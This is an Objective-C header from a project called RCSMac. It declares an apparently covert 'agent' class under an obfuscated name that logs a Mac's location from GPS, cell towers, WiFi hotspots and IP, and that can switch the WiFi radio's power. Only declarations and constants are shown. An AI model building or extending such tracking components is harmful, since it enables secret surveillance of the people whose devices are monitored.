//
//  RCSMAgentPosition.h
//  RCSMac
//
//  Created by kiodo on 2/21/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <SystemConfiguration/SystemConfiguration.h>

#import "RCSMLogManager.h"

#define LOGTYPE_LOCATION_NEW    0x1220
#define LOGTYPE_LOCATION_GPS    0x0001
#define LOGTYPE_LOCATION_GSM    0x0002
#define LOGTYPE_LOCATION_WIFI   0x0003
#define LOGTYPE_LOCATION_IP     0x0004
#define LOGTYPE_LOCATION_CDMA   0x0005

typedef struct _position {
  UInt32 sleepTime;
#define LOGGER_GPS  1  // Take GPS Position
#define LOGGER_GSM  2  // Take BTS Position
#define LOGGER_WIFI 4  // Take nearby WiFi list
  UInt32 iType;
} positionStruct;

typedef struct _LocationAdditionalData {
	UInt32 uVersion;
#define LOG_LOCATION_VERSION (UInt32)2010082401
	UInt32 uType;
	UInt32 uStructNum;
} LocationAdditionalData;


@interface __m_MAgentPosition : NSObject 
{    
@private
  NSMutableDictionary *mAgentConfiguration;
}

+ (__m_MAgentPosition *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (SCNetworkInterfaceRef)getAirportInterface:(CFStringRef) aNetInterface;
- (BOOL)setAirportPower:(CFStringRef) aNetInterface withMode:(BOOL)power;
- (BOOL)isAirportPowerOn:(CFStringRef)aNetInterface;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;
- (BOOL)grabHotspots;
- (BOOL)stop;
- (void)start;
@end
